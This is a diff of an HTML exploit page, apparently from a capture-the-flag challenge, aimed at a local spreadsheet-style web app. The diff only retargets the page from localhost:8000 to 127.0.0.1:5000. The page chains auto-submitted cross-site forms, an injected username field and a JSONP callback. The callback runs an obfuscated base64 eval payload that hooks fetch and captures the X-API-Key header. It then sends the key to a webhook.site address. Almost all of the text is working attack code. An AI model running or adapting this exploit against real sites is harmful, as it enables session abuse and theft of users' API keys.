@@ -1,16 +1,16 @@
 <!DOCTYPE html>
 <html>
 <body>
-  <form id="f1" target="worker" action="http://localhost:8000/#/sheets" method="GET"></form>
+  <form id="f1" target="worker" action="http://127.0.0.1:5000/#/sheets" method="GET"></form>
 
-  <form id="f2" target="logout" action="http://localhost:8000/api/logout" method="GET"></form>
+  <form id="f2" target="logout" action="http://127.0.0.1:5000/api/logout" method="GET"></form>
 
-  <form id="f3" target="logout" action="http://localhost:8000/api/whoami"
+  <form id="f3" target="logout" action="http://127.0.0.1:5000/api/whoami"
         method="POST" enctype="text/plain">
-    <input name='{"new_username":"<</textarea><iframe srcdoc=<script/src' value='http://localhost:5000/api/whoami/jsonp?callback=https://webhook.site/2dc905f2-89e6-493d-bc1b-1d51702524e0?k=hi></script></iframe>"}'>
+    <input name='{"new_username":"<</textarea><iframe srcdoc=<script/src' value='http://127.0.0.1:5000/api/whoami/jsonp?callback=eval%28atob%28%60Y29uc3Qgdz13aW5kb3cub3BlbihgYCxgd29ya2VyYCk7Y29uc3Qgb3JpZ2luYWxGZXRjaD13LmZldGNoO3cuZmV0Y2g9YXN5bmMgZnVuY3Rpb24odXJsLG9wdGlvbnMpe2lmKHVybC5pbmNsdWRlcyhgL2FwaS9zaGVldHNgKSYmb3B0aW9ucz8ubWV0aG9kPT09YFBPU1RgKXtjb25zdCBoZWFkZXJzPW9wdGlvbnMuaGVhZGVyc3x8e307Y29uc3QgYXBpS2V5PWhlYWRlcnMgaW5zdGFuY2VvZiBIZWFkZXJzP2hlYWRlcnMuZ2V0KGBYLUFQSS1LZXlgKTpoZWFkZXJzW2BYLUFQSS1LZXlgXTt3LnN0b2xlbktleT1hcGlLZXk7cmV0dXJuIFByb21pc2UucmVzb2x2ZShuZXcgUmVzcG9uc2UoYHt9YCx7c3RhdHVzOjIwMH0pKTt9ZWxzZXtyZXR1cm4gb3JpZ2luYWxGZXRjaCh1cmwsb3B0aW9ucyk7fX07dy5kb2N1bWVudC5xdWVyeVNlbGVjdG9yKGAjYXBwPmRpdj5tYWluPnNlY3Rpb24+YnV0dG9uYCkuY2xpY2soKTt3aW5kb3cubG9jYXRpb249YGh0dHBzOi8vd2ViaG9vay5zaXRlLzJkYzkwNWYyLTg5ZTYtNDkzZC1iYzFiLTFkNTE3MDI1MjRlMD9rPWArdy5zdG9sZW5LZXk7%60%29%29//></script></iframe>"}'>
   </form>
 
-  <form id="f4" target="logout" action="http://localhost:8000/#/settings" method="GET"></form>
+  <form id="f4" target="logout" action="http://127.0.0.1:5000/#/settings" method="GET"></form>
 
   <script>
     function exploit(data) {
@@ -32,7 +32,7 @@
     }
 </script>
 
-<script src=http://localhost:8000/api/whoami/jsonp?callback=exploit></script>
+<script src=http://127.0.0.1:5000/api/whoami/jsonp?callback=exploit></script>
 
 </body>
 </html>
